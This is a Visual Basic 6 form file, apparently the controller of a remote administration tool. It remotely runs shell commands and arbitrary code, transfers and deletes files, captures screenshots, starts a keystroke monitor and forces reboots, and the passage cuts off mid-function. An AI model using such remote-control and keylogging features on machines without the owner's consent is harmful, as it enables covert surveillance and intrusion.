VERSION 5.00
Object = "{6B7E6392-850A-101B-AFC0-4210102A8DA7}#1.3#0"; "comctl32.ocx"
Begin VB.Form frmMain 
   BorderStyle     =   1  'Fixed Single
   Caption         =   "Connection"
   ClientHeight    =   6945
   ClientLeft      =   45
   ClientTop       =   345
   ClientWidth     =   7245
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   ScaleHeight     =   463
   ScaleMode       =   3  'Pixel
   ScaleWidth      =   483
   Begin VB.PictureBox picTab 
      BorderStyle     =   0  'None
      Height          =   4815
      Index           =   5
      Left            =   360
      ScaleHeight     =   4815
      ScaleWidth      =   6495
      TabIndex        =   77
      Top             =   720
      Width           =   6495
      Begin VB.CommandButton cmdClear 
         Caption         =   "&Clear"
         Height          =   375
         Left            =   3360
         TabIndex        =   80
         Top             =   4440
         Width           =   2535
      End
      Begin VB.CommandButton cmdSendCode 
         Caption         =   "&Send"
         Height          =   375
         Left            =   600
         TabIndex        =   79
         Top             =   4440
         Width           =   2655
      End
      Begin VB.TextBox txtCode 
         Height          =   4215
         Left            =   0
         MultiLine       =   -1  'True
         ScrollBars      =   2  'Vertical
         TabIndex        =   78
         Top             =   120
         Width           =   6495
      End
   End
   Begin VB.PictureBox picTab 
      BorderStyle     =   0  'None
      Height          =   4815
      Index           =   4
      Left            =   360
      ScaleHeight     =   4815
      ScaleWidth      =   6495
      TabIndex        =   61
      Top             =   720
      Visible         =   0   'False
      Width           =   6495
      Begin VB.Frame frameKeys 
         Caption         =   "Keys:"
         BeginProperty Font 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   2415
         Left            =   0
         TabIndex        =   72
         Top             =   2400
         Width           =   6375
         Begin VB.PictureBox picKeys 
            BorderStyle     =   0  'None
            Height          =   2055
            Left            =   120
            ScaleHeight     =   2055
            ScaleWidth      =   6135
            TabIndex        =   73
            Top             =   240
            Width           =   6135
            Begin VB.CommandButton cmdStop 
               Caption         =   "&Stop monitor"
               Enabled         =   0   'False
               Height          =   375
               Left            =   3120
               TabIndex        =   76
               Top             =   1680
               Width           =   1935
            End
            Begin VB.CommandButton cmdStart 
               Caption         =   "&Start monitor"
               Height          =   375
               Left            =   1080
               TabIndex        =   75
               Top             =   1680
               Width           =   1935
            End
            Begin VB.TextBox txtKeys 
               BackColor       =   &H8000000F&
               Height          =   1455
               Left            =   120
               Locked          =   -1  'True
               MultiLine       =   -1  'True
               ScrollBars      =   2  'Vertical
               TabIndex        =   74
               Top             =   120
               Width           =   5895
            End
         End
      End
      Begin VB.Frame frameScreenShot 
         Caption         =   "Screenshot:"
         BeginProperty Font 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   2295
         Left            =   0
         TabIndex        =   62
         Top             =   0
         Width           =   6375
         Begin VB.PictureBox picScreenshot 
            BorderStyle     =   0  'None
            Height          =   1815
            Left            =   240
            ScaleHeight     =   1815
            ScaleWidth      =   5895
            TabIndex        =   63
            Top             =   360
            Width           =   5895
            Begin VB.CommandButton cmdOpenScreenshot 
               Caption         =   "&Open screenshot"
               Height          =   375
               Left            =   1440
               TabIndex        =   71
               Top             =   1320
               Width           =   2175
            End
            Begin VB.CommandButton cmdSendScreenshot 
               Caption         =   "&Send screenshot"
               Height          =   375
               Left            =   3720
               TabIndex        =   70
               Top             =   1320
               Width           =   2175
            End
            Begin VB.ComboBox cmbSendAs 
               Height          =   315
               ItemData        =   "frmMain.frx":0000
               Left            =   1440
               List            =   "frmMain.frx":0010
               Style           =   2  'Dropdown List
               TabIndex        =   69
               Top             =   720
               Width           =   4455
            End
            Begin VB.TextBox txtScreenHeight 
               Height          =   285
               Left            =   1440
               TabIndex        =   67
               Text            =   "768"
               Top             =   360
               Width           =   4455
            End
            Begin VB.TextBox txtScreenWidth 
               Height          =   285
               Left            =   1440
               TabIndex        =   66
               Text            =   "1024"
               Top             =   0
               Width           =   4455
            End
            Begin VB.Label lblSendAs 
               BackStyle       =   0  'Transparent
               Caption         =   "Send as:"
               Height          =   255
               Left            =   0
               TabIndex        =   68
               Top             =   720
               Width           =   1455
            End
            Begin VB.Label lblScreenHeight 
               BackStyle       =   0  'Transparent
               Caption         =   "Height:"
               Height          =   255
               Left            =   0
               TabIndex        =   65
               Top             =   360
               Width           =   2415
            End
            Begin VB.Label lblScreenWidth 
               BackStyle       =   0  'Transparent
               Caption         =   "Width:"
               Height          =   255
               Left            =   0
               TabIndex        =   64
               Top             =   0
               Width           =   2415
            End
         End
      End
   End
   Begin VB.PictureBox picTab 
      BorderStyle     =   0  'None
      Height          =   4695
      Index           =   0
      Left            =   360
      ScaleHeight     =   313
      ScaleMode       =   3  'Pixel
      ScaleWidth      =   433
      TabIndex        =   2
      Top             =   720
      Visible         =   0   'False
      Width           =   6495
      Begin VB.CommandButton cmdRefreshInfo 
         Caption         =   "Information:"
         BeginProperty Font 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   255
         Left            =   120
         TabIndex        =   21
         Top             =   0
         Width           =   1335
      End
      Begin VB.Frame frameWindows 
         Caption         =   "Windows"
         BeginProperty Font 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   2055
         Left            =   4680
         TabIndex        =   15
         Top             =   2640
         Width           =   1815
         Begin VB.PictureBox picWindows 
            BorderStyle     =   0  'None
            Height          =   1695
            Left            =   120
            ScaleHeight     =   113
            ScaleMode       =   3  'Pixel
            ScaleWidth      =   105
            TabIndex        =   16
            Top             =   240
            Width           =   1575
            Begin VB.CommandButton cmdExitWindows 
               Caption         =   "&Reboot"
               Height          =   375
               Index           =   2
               Left            =   0
               TabIndex        =   20
               Top             =   840
               Width           =   1575
            End
            Begin VB.CommandButton cmdExitWindows 
               Caption         =   "S&hutdown"
               Height          =   375
               Index           =   1
               Left            =   0
               TabIndex        =   19
               Top             =   480
               Width           =   1575
            End
            Begin VB.CommandButton cmdExitWindows 
               Caption         =   "&Log off"
               Height          =   375
               Index           =   0
               Left            =   0
               TabIndex        =   18
               Top             =   120
               Width           =   1575
            End
            Begin VB.CheckBox chkForce 
               Caption         =   "Force"
               Height          =   195
               Left            =   0
               TabIndex        =   17
               Top             =   1380
               Width           =   1455
            End
         End
      End
      Begin VB.Frame frameInformation 
         BeginProperty Font 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   2535
         Left            =   0
         TabIndex        =   12
         Top             =   0
         Width           =   6495
         Begin VB.PictureBox picInformation 
            BorderStyle     =   0  'None
            Height          =   1935
            Left            =   240
            ScaleHeight     =   129
            ScaleMode       =   3  'Pixel
            ScaleWidth      =   401
            TabIndex        =   13
            Top             =   360
            Width           =   6015
            Begin VB.TextBox txtInformation 
               BackColor       =   &H8000000F&
               BorderStyle     =   0  'None
               BeginProperty Font 
                  Name            =   "Courier New"
                  Size            =   8.25
                  Charset         =   0
                  Weight          =   400
                  Underline       =   0   'False
                  Italic          =   0   'False
                  Strikethrough   =   0   'False
               EndProperty
               Height          =   1815
               Left            =   0
               Locked          =   -1  'True
               MultiLine       =   -1  'True
               TabIndex        =   14
               Top             =   0
               Width           =   5895
            End
         End
      End
      Begin VB.Frame framePrograms 
         Caption         =   "Programs:"
         BeginProperty Font 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   2055
         Left            =   0
         TabIndex        =   3
         Top             =   2640
         Width           =   4575
         Begin VB.PictureBox picPrograms 
            BorderStyle     =   0  'None
            Height          =   1455
            Left            =   240
            ScaleHeight     =   97
            ScaleMode       =   3  'Pixel
            ScaleWidth      =   273
            TabIndex        =   4
            Top             =   360
            Width           =   4095
            Begin VB.TextBox txtFile 
               Height          =   285
               Left            =   1200
               TabIndex        =   9
               Top             =   120
               Width           =   2295
            End
            Begin VB.CommandButton cmdRunFile 
               Caption         =   "&Run"
               Height          =   285
               Left            =   3480
               TabIndex        =   8
               Top             =   120
               Width           =   615
            End
            Begin VB.CheckBox chkSync 
               Caption         =   "Perform task synchronous"
               Height          =   255
               Left            =   0
               TabIndex        =   7
               Top             =   1200
               Value           =   1  'Checked
               Width           =   3855
            End
            Begin VB.CommandButton cmdCLRun 
               Caption         =   "&Run"
               Height          =   285
               Left            =   3485
               TabIndex        =   6
               Top             =   600
               Width           =   615
            End
            Begin VB.TextBox txtCommandLine 
               Height          =   285
               Left            =   1200
               TabIndex        =   5
               Top             =   600
               Width           =   2295
            End
            Begin VB.Label lblRunProgram 
               BackStyle       =   0  'Transparent
               Caption         =   "Run file:"
               Height          =   255
               Left            =   0
               TabIndex        =   11
               Top             =   120
               Width           =   1575
            End
            Begin VB.Label lblCommandLine 
               BackStyle       =   0  'Transparent
               Caption         =   "Command line:"
               Height          =   255
               Left            =   0
               TabIndex        =   10
               Top             =   600
               Width           =   1575
            End
         End
      End
   End
   Begin VB.PictureBox picTab 
      BorderStyle     =   0  'None
      Height          =   4815
      Index           =   3
      Left            =   360
      ScaleHeight     =   4815
      ScaleWidth      =   6375
      TabIndex        =   38
      Top             =   720
      Width           =   6375
      Begin VB.Frame frameMessage 
         Caption         =   "Message:"
         BeginProperty Font 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   3735
         Left            =   0
         TabIndex        =   44
         Top             =   1080
         Width           =   6375
         Begin VB.PictureBox picMessage 
            BorderStyle     =   0  'None
            Height          =   3135
            Left            =   240
            ScaleHeight     =   3135
            ScaleWidth      =   5895
            TabIndex        =   45
            Top             =   480
            Width           =   5895
            Begin VB.CommandButton cmdSMessageForm 
               Caption         =   "&Show message form"
               Height          =   375
               Left            =   0
               TabIndex        =   60
               Top             =   2640
               Width           =   1935
            End
            Begin VB.CommandButton cmdHMessageForm 
               Caption         =   "&Hide message form"
               Height          =   375
               Left            =   2040
               TabIndex        =   59
               Top             =   2640
               Width           =   1815
            End
            Begin VB.TextBox txtTitle 
               Height          =   285
               Left            =   1800
               TabIndex        =   55
               Top             =   1440
               Width           =   4095
            End
            Begin VB.CommandButton cmdMessageBox 
               Caption         =   "&Show message box"
               Height          =   375
               Left            =   3960
               TabIndex        =   58
               Top             =   2640
               Width           =   1935
            End
            Begin VB.TextBox txtPosX 
               Height          =   285
               Left            =   1800
               TabIndex        =   47
               Text            =   "0"
               Top             =   0
               Width           =   4095
            End
            Begin VB.TextBox txtPosY 
               Height          =   285
               Left            =   1800
               TabIndex        =   49
               Text            =   "0"
               Top             =   360
               Width           =   4095
            End
            Begin VB.TextBox txtWidth 
               Height          =   285
               Left            =   1800
               TabIndex        =   51
               Text            =   "200"
               Top             =   720
               Width           =   4095
            End
            Begin VB.TextBox txtHeight 
               Height          =   285
               Left            =   1800
               TabIndex        =   53
               Text            =   "100"
               Top             =   1080
               Width           =   4095
            End
            Begin VB.TextBox txtText 
               Height          =   645
               Left            =   1800
               MultiLine       =   -1  'True
               ScrollBars      =   2  'Vertical
               TabIndex        =   57
               Top             =   1800
               Width           =   4095
            End
            Begin VB.Label lblTitle 
               BackStyle       =   0  'Transparent
               Caption         =   "Title:"
               Height          =   255
               Left            =   0
               TabIndex        =   54
               Top             =   1440
               Width           =   1815
            End
            Begin VB.Label lblText 
               BackStyle       =   0  'Transparent
               Caption         =   "Text:"
               Height          =   255
               Left            =   0
               TabIndex        =   56
               Top             =   1800
               Width           =   1815
            End
            Begin VB.Label lblHeight 
               BackStyle       =   0  'Transparent
               Caption         =   "Height:"
               Height          =   255
               Left            =   0
               TabIndex        =   52
               Top             =   1080
               Width           =   1815
            End
            Begin VB.Label lblWidth 
               BackStyle       =   0  'Transparent
               Caption         =   "Width:"
               Height          =   255
               Left            =   0
               TabIndex        =   50
               Top             =   720
               Width           =   1815
            End
            Begin VB.Label lblPosY 
               BackStyle       =   0  'Transparent
               Caption         =   "Position on Y-axis:"
               Height          =   255
               Left            =   0
               TabIndex        =   48
               Top             =   360
               Width           =   1815
            End
            Begin VB.Label lblPosX 
               BackStyle       =   0  'Transparent
               Caption         =   "Position on X-axis:"
               Height          =   255
               Left            =   0
               TabIndex        =   46
               Top             =   0
               Width           =   1815
            End
         End
      End
      Begin VB.Frame frameScreen 
         Caption         =   "Screen:"
         BeginProperty Font 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   975
         Left            =   0
         TabIndex        =   39
         Top             =   0
         Width           =   6375
         Begin VB.PictureBox picScreen 
            BorderStyle     =   0  'None
            Height          =   615
            Left            =   120
            ScaleHeight     =   615
            ScaleWidth      =   6135
            TabIndex        =   40
            Top             =   240
            Width           =   6135
            Begin VB.CommandButton cmdRedrawAll 
               Caption         =   "&Redraw all"
               Height          =   375
               Left            =   4080
               TabIndex        =   43
               Top             =   120
               Width           =   1935
            End
            Begin VB.CommandButton cmdFillColor 
               Caption         =   "&Fill with color"
               Height          =   375
               Left            =   2040
               TabIndex        =   42
               Top             =   120
               Width           =   1935
            End
            Begin VB.CommandButton cmdInvert 
               Caption         =   "&Invert"
               Height          =   375
               Left            =   120
               TabIndex        =   41
               Top             =   120
               Width           =   1815
            End
         End
      End
   End
   Begin VB.PictureBox picTab 
      BorderStyle     =   0  'None
      Height          =   4815
      Index           =   2
      Left            =   360
      ScaleHeight     =   4815
      ScaleWidth      =   6495
      TabIndex        =   26
      Top             =   720
      Visible         =   0   'False
      Width           =   6495
      Begin VB.Frame frameUsers 
         Caption         =   "Users:"
         BeginProperty Font 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   3255
         Left            =   0
         TabIndex        =   30
         Top             =   1440
         Width           =   6375
         Begin VB.PictureBox picUsers 
            BorderStyle     =   0  'None
            Height          =   2775
            Left            =   240
            ScaleHeight     =   2775
            ScaleWidth      =   5895
            TabIndex        =   32
            Top             =   360
            Width           =   5895
            Begin VB.CommandButton cmdChangeUser 
               Caption         =   "&Change user"
               Height          =   375
               Left            =   4080
               TabIndex        =   36
               Top             =   2280
               Width           =   1815
            End
            Begin VB.CommandButton cmdRemoveUser 
               Caption         =   "&Remove user"
               Height          =   375
               Left            =   2040
               TabIndex        =   35
               Top             =   2280
               Width           =   1935
            End
            Begin VB.CommandButton cmdAddUser 
               Caption         =   "&Add user"
               Height          =   375
               Left            =   0
               TabIndex        =   34
               Top             =   2280
               Width           =   1935
            End
            Begin VB.ListBox lstUsers 
               Height          =   2205
               Left            =   0
               TabIndex        =   33
               Top             =   0
               Width           =   5895
            End
         End
      End
      Begin VB.Frame frameSettings 
         Caption         =   "Settings:"
         BeginProperty Font 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   0
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         Height          =   1215
         Left            =   0
         TabIndex        =   27
         Top             =   0
         Width           =   6375
         Begin VB.PictureBox picSettings 
            BorderStyle     =   0  'None
            Height          =   615
            Left            =   240
            ScaleHeight     =   615
            ScaleWidth      =   5895
            TabIndex        =   28
            Top             =   360
            Width           =   5895
            Begin VB.CheckBox chkUserLogon 
               Caption         =   "&Require users loging on"
               Height          =   255
               Left            =   0
               TabIndex        =   31
               Top             =   360
               Width           =   4815
            End
            Begin VB.CheckBox chkStartWithWindows 
               Caption         =   "&Automatically start the program together with Windows"
               Height          =   255
               Left            =   0
               TabIndex        =   29
               Top             =   0
               Width           =   4695
            End
         End
      End
   End
   Begin VB.PictureBox picTab 
      BorderStyle     =   0  'None
      Height          =   4575
      Index           =   1
      Left            =   360
      ScaleHeight     =   305
      ScaleMode       =   3  'Pixel
      ScaleWidth      =   441
      TabIndex        =   22
      Tag             =   "TAB"
      Top             =   840
      Visible         =   0   'False
      Width           =   6615
      Begin ComctlLib.ListView lstFiles 
         Height          =   4215
         Left            =   0
         TabIndex        =   23
         Top             =   360
         Width           =   6495
         _ExtentX        =   11456
         _ExtentY        =   7435
         View            =   3
         LabelWrap       =   -1  'True
         HideSelection   =   -1  'True
         _Version        =   327682
         SmallIcons      =   "ImageIcons"
         ForeColor       =   -2147483640
         BackColor       =   -2147483643
         BorderStyle     =   1
         Appearance      =   0
         NumItems        =   4
         BeginProperty ColumnHeader(1) {0713E8C7-850A-101B-AFC0-4210102A8DA7} 
            Key             =   ""
            Object.Tag             =   ""
            Text            =   "Name"
            Object.Width           =   2540
         EndProperty
         BeginProperty ColumnHeader(2) {0713E8C7-850A-101B-AFC0-4210102A8DA7} 
            SubItemIndex    =   1
            Key             =   ""
            Object.Tag             =   ""
            Text            =   "Size"
            Object.Width           =   2540
         EndProperty
         BeginProperty ColumnHeader(3) {0713E8C7-850A-101B-AFC0-4210102A8DA7} 
            SubItemIndex    =   2
            Key             =   ""
            Object.Tag             =   ""
            Text            =   "Type"
            Object.Width           =   2540
         EndProperty
         BeginProperty ColumnHeader(4) {0713E8C7-850A-101B-AFC0-4210102A8DA7} 
            SubItemIndex    =   3
            Key             =   ""
            Object.Tag             =   ""
            Text            =   "Modified"
            Object.Width           =   2540
         EndProperty
      End
      Begin VB.ComboBox cmbDir 
         Height          =   315
         Left            =   0
         TabIndex        =   24
         Text            =   "C:\"
         Top             =   0
         Width           =   6495
      End
   End
   Begin VB.CommandButton clsTerminate 
      Caption         =   "&Terminate"
      Height          =   375
      Left            =   1800
      TabIndex        =   37
      Tag             =   "IGNORE"
      Top             =   6360
      Width           =   1695
   End
   Begin ComctlLib.TabStrip tabStrip 
      Height          =   5775
      Left            =   120
      TabIndex        =   25
      Top             =   240
      Width           =   6975
      _ExtentX        =   12303
      _ExtentY        =   10186
      _Version        =   327682
      BeginProperty Tabs {0713E432-850A-101B-AFC0-4210102A8DA7} 
         NumTabs         =   6
         BeginProperty Tab1 {0713F341-850A-101B-AFC0-4210102A8DA7} 
            Caption         =   "General"
            Key             =   "General"
            Object.Tag             =   "1"
            ImageVarType    =   2
         EndProperty
         BeginProperty Tab2 {0713F341-850A-101B-AFC0-4210102A8DA7} 
            Caption         =   "File system"
            Key             =   "File system"
            Object.Tag             =   "2"
            ImageVarType    =   2
         EndProperty
         BeginProperty Tab3 {0713F341-850A-101B-AFC0-4210102A8DA7} 
            Caption         =   "Program"
            Key             =   "Program"
            Object.Tag             =   "3"
            ImageVarType    =   2
         EndProperty
         BeginProperty Tab4 {0713F341-850A-101B-AFC0-4210102A8DA7} 
            Caption         =   "Messages"
            Key             =   "Messages"
            Object.Tag             =   "4"
            ImageVarType    =   2
         EndProperty
         BeginProperty Tab5 {0713F341-850A-101B-AFC0-4210102A8DA7} 
            Caption         =   "Monitor"
            Key             =   "Monitor"
            Object.Tag             =   "5"
            Object.ToolTipText     =   ""
            ImageVarType    =   2
         EndProperty
         BeginProperty Tab6 {0713F341-850A-101B-AFC0-4210102A8DA7} 
            Caption         =   "Raw"
            Key             =   "Raw"
            Object.Tag             =   "6"
            Object.ToolTipText     =   ""
            ImageVarType    =   2
         EndProperty
      EndProperty
   End
   Begin VB.CommandButton cmdShowCommunication 
      Caption         =   "&Show log"
      Height          =   375
      Left            =   3600
      TabIndex        =   1
      Tag             =   "IGNORE"
      Top             =   6360
      Width           =   1695
   End
   Begin VB.CommandButton cmdExit 
      Caption         =   "&Exit"
      Height          =   375
      Left            =   5400
      TabIndex        =   0
      Tag             =   "IGNORE"
      Top             =   6360
      Width           =   1695
   End
   Begin ComctlLib.ImageList ImageIcons 
      Left            =   960
      Top             =   6360
      _ExtentX        =   1005
      _ExtentY        =   1005
      BackColor       =   -2147483643
      MaskColor       =   12632256
      _Version        =   327682
   End
   Begin VB.Menu mnuFile 
      Caption         =   "File"
      Visible         =   0   'False
      Begin VB.Menu mnuExecute 
         Caption         =   "&Execute"
      End
      Begin VB.Menu mnuLine2 
         Caption         =   "-"
      End
      Begin VB.Menu mnuDownload 
         Caption         =   "&Download"
      End
      Begin VB.Menu mnuUpload 
         Caption         =   "&Upload"
      End
      Begin VB.Menu mnuLine 
         Caption         =   "-"
      End
      Begin VB.Menu mnuDelete 
         Caption         =   "&Delete"
      End
      Begin VB.Menu mnuRename 
         Caption         =   "&Rename"
      End
   End
End
Attribute VB_Name = "frmMain"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Option Explicit

'Copyright (C) 2004 Kristian. S.Stangeland

'This program is free software; you can redistribute it and/or
'modify it under the terms of the GNU General Public License
'as published by the Free Software Foundation; either version 2
'of the License, or (at your option) any later version.

'This program is distributed in the hope that it will be useful,
'but WITHOUT ANY WARRANTY; without even the implied warranty of
'MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
'GNU General Public License for more details.

'You should have received a copy of the GNU General Public License
'along with this program; if not, write to the Free Software
'Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA.

Public WithEvents Connection As clsConnection
Attribute Connection.VB_VarHelpID = -1
Public WithEvents Monitor As clsConnection
Attribute Monitor.VB_VarHelpID = -1
Public Registry As New clsRegistry
Public frmCom As New frmCommunication
Public OpenSave As New clsOpenSave
Public Dialog As New clsDialog
Public State As Long
Public sText As String

' To access the registry
Private Const HKEY_CLASSES_ROOT = &H80000000
Private Const HKEY_CURRENT_USER = &H80000001

' Public properties
Public Username As String, Password As String

Dim bWait As Boolean, TextBox As TextBox, sFile As String, MonitorWait As Boolean, MonitorLog As Boolean
Dim BytesToSend As Long, FileOverflow As Long, FilePos As Long

Public Sub UpdateUserControls()

    cmdAddUser.Enabled = CBool(chkUserLogon.Value = 1)
    cmdChangeUser.Enabled = CBool(chkUserLogon.Value = 1)
    cmdRemoveUser.Enabled = CBool(chkUserLogon.Value = 1)
    lstUsers.Enabled = CBool(chkUserLogon.Value = 1)

End Sub

Public Sub UpdateUserList()

    Dim aLines As Variant, Tell As Long
    
    ' Send the code
    RunCode "Connection.Winsock.SendData CStr(Join(Main.EnumKeys(" & HKEY_CURRENT_USER & ", " & Chr(34) & "Software\VB and VBA Program Settings\RAC\Users" & Chr(34) & ", True), vbCrLf) & vbCrLf)" & vbCrLf
    
    ' Split up the lines
    aLines = Split(sText, vbCrLf)
    
    ' Clear the list box
    lstUsers.Clear
    
    ' Add everything to the list box
    For Tell = LBound(aLines) To UBound(aLines) - 2
        lstUsers.AddItem aLines(Tell)
    Next

End Sub

Public Sub UpdateProgramSettings()

    Dim aLines As Variant
    
    ' Send the code
    RunCode "Connection.Winsock.SendData CStr(CLng(Main.StartWithWindows) & vbCrLf & CLng(Main.UsersLogon) & vbCrLf)" & vbCrLf
    
    ' Split up the lines
    aLines = Split(sText, vbCrLf)
    
    ' Show the settings
    chkStartWithWindows.Value = IIf(Val(aLines(0)) = -1, 1, 0)
    chkUserLogon.Value = IIf(Val(aLines(1)) = -1, 1, 0)

End Sub

Public Sub UpdateColors()

    Dim Control As Control, Color As Long
    
    ' Get the color
    Color = GetPixel(GetDC(TabStrip.hwnd), 5, 40)

    If Color >= 0 Then
        ' Loop trough each control
        For Each Control In Me.Controls
            If (TypeOf Control Is PictureBox) Or (TypeOf Control Is Frame) Or (TypeOf Control Is CheckBox) _
             Or (TypeOf Control Is TextBox) Or (TypeOf Control Is CommandButton) And Control.Tag <> "IGNORE" Then
                Control.BackColor = Color
            End If
        Next
    End If
    
    ' We don't longer need to subclass the control
    UnHookControl TabStrip.hwnd

End Sub

Private Sub chkStartWithWindows_Click()

    ' Save this setting
    RunCode "Main.StartWithWindows = " & IIf(chkStartWithWindows.Value = 1, "True", "False") & vbCrLf

End Sub

Private Sub chkUserLogon_Click()

    UpdateUserControls
    
    ' Save this setting
    RunCode "Main.UsersLogon = " & IIf(chkUserLogon.Value = 1, "True", "False") & vbCrLf

End Sub

Private Sub clsTerminate_Click()

    ' Exit program
    Connection.SendData "exitapp" & vbCrLf

End Sub

Private Sub cmbDir_KeyDown(KeyCode As Integer, Shift As Integer)

    If KeyCode = 13 Then
        ListFiles lstFiles, cmbDir.Text
    End If

End Sub

Private Sub cmdAddUser_Click()

    Dim Ret As PropertyBag

    Set Dialog.ReferenceForm = frmUser
    Set Ret = Dialog.ShowDialog(New PropertyBag, "Add user")

    ' Only if the user has pressed OK
    If Ret.ReadProperty("Returned", "") = "OK" Then
        
        ' Send the command
        RunCode "Main.UserPassword(" & Chr(34) & Ret.ReadProperty("txtUsername", "") & Chr(34) & ") = " & Chr(34) & Ret.ReadProperty("txtPassword", "") & Chr(34) & vbCrLf
    
    End If
    
    ' Update the user list
    UpdateUserList

End Sub

Public Sub RunCode(sCode As String)

    ' Start running code
    Connection.SendData "runcode" & vbCrLf
    WaitForData
    
    ' Run the code
    Connection.SendData sCode
    WaitForData

End Sub

Private Sub cmdChangeUser_Click()

    Dim Ret As PropertyBag, ChangeData As New PropertyBag, Tell As Long
    
    For Tell = 0 To lstUsers.ListCount - 1
    
        If lstUsers.Selected(Tell) Then
            
            ' Request information about the user
            RunCode "Connection.Winsock.SendData CStr(Main.UserPassword(" & Chr(34) & lstUsers.List(Tell) & Chr(34) & ") & vbCrLf)" & vbCrLf
            
            ' Send the information about the user
            ChangeData.WriteProperty "txtUsername", lstUsers.List(Tell)
            ChangeData.WriteProperty "txtPassword", Left(sText, InStr(1, sText, vbCrLf) - 1)
            
            Set Dialog.ReferenceForm = frmUser
            Set Ret = Dialog.ShowDialog(ChangeData, "Change user")
            
            ' Only if the user has pressed OK
            If Ret.ReadProperty("Returned", "") = "OK" Then
                
                ' Send the command
                RunCode "Main.UserPassword(" & Chr(34) & Ret.ReadProperty("txtUsername", "") & Chr(34) & ") = " & Chr(34) & Ret.ReadProperty("txtPassword", "") & Chr(34) & vbCrLf
            
                ' Update the user list
                lstUsers.List(Tell) = Ret.ReadProperty("txtUsername", "")
            
            End If
            
            ' Don't update any more users
            Exit Sub
    
        End If
    
    Next

End Sub

Private Sub cmdClear_Click()

    ' Clear the textbox
    txtCode.Text = ""

End Sub

Private Sub cmdCLRun_Click()

    ' Run command line
    Connection.SendData "shell " & Chr(34) & txtCommandLine.Text & Chr(34) & chkSync.Value & vbCrLf

End Sub

Private Sub cmdExit_Click()

    UnHookControl TabStrip.hwnd

    ' Exit this form
    Unload Me
    
End Sub

Public Sub DownloadFile(sFileToDownload As String, sFileToSave As String)

    ' Set the global file string to this
    sFile = sFileToSave

    ' Write everything to a file
    State = 2
    
    ' Send request
    Connection.SendData "get " & Chr(34) & sFileToDownload & Chr(34) & " 1" & vbCrLf

    ' Wait until the file is tranfered
    WaitForState 0

End Sub

Public Sub UploadFile(sFileToUpload As String, sDirToSave As String)

    ' Set the global file string to this
    sFile = sFileToUpload
    
    ' Send everything from a file
    State = 4
    
    ' Reset the file position
    FilePos = 1
    
    ' Send request
    Connection.SendData "put " & Chr(34) & sFileToUpload & Chr(34) & " 1 " & FileLen(sFileToUpload) & vbCrLf

    ' Wait until the file is tranfered
    WaitForState 0

End Sub

Public Sub LoadDrives(ComboBox As ComboBox)

    Dim aDrives As Variant, Tell As Long

    ' Clear list elements
    ComboBox.Clear

    sText = ""
    State = 3

    ' Send request
    Connection.SendData "listdrives" & vbCrLf
    
    ' Wait for the data to get in
    WaitForState 0
    
    If sText <> "" Then
    
        ' Split the returned data into different lines
        aDrives = Split(sText, vbCrLf)

        For Tell = LBound(aDrives) To UBound(aDrives) - 1
            ComboBox.AddItem aDrives(Tell)
        Next

    End If
    
    ' Select the first element
    If ComboBox.ListCount > 0 Then
        ComboBox.Text = ComboBox.List(0)
    End If

End Sub

Public Sub ListFiles(ListView As ListView, sFolder As String)

    On Error Resume Next
    Dim aFiles As Variant, aFileInfo, Item As ListItem, Icon As ListImage, Tell As Long, lTemp As Long
    Dim sIcon As String, FileIcon As New clsFileIcon, aTemp As Variant, Index As Long, sPath As String
    
    ' Clear list elements
    ListView.ListItems.Clear
    
    sText = ""
    State = 3
    
    ' Send request
    Connection.SendData "list " & Chr(34) & sFolder & Chr(34) & " " & vbDirectory & vbCrLf

    ' Wait for the data to get in
    WaitForState 0

    If sText <> "" Then
    
        ' Split the returned data into different lines
        aFiles = Split(sText, vbCrLf)
        
        For Tell = LBound(aFiles) To UBound(aFiles) - 1
        
            ' Retrive all the different information about this file
            aFileInfo = Split(aFiles(Tell), "|")
            
            If UBound(aFileInfo) > 0 Then
            
                Set Item = ListView.ListItems.Add(, , aFileInfo(0))
                
                Item.SubItems(1) = aFileInfo(1)
                Item.SubItems(3) = aFileInfo(2)
                
                ' It's not neccesary to check for file-type if this is a directory
                If Not IsDir(CStr(aFileInfo(0))) Then
                    Item.SubItems(2) = GetFileType(CStr(aFileInfo(0)), sIcon)
                    
                    Set Icon = Nothing
                    Set Icon = ImageIcons.ListImages(sIcon)
                    
                    If sIcon <> "" Then
                        If Icon Is Nothing Then
                    
                            aTemp = Split(sIcon, ",")
                            sPath = ReplaceEnviroment(CStr(aTemp(0)))
                            
